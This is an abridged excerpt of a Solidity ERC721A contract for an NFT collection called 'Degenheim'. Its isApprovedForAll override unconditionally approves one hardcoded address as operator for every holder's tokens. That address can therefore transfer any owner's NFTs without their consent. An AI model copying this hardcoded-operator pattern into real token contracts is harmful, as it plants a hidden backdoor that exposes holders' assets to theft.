  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x3404B9B1da69b16d971D2cfC71cac72e1C06745d){return true;}
...
contract Degenheim is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  uint public maxSupply = 6450;
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Degenheim", "DHM", maxBatchSize_, collectionSize_) {
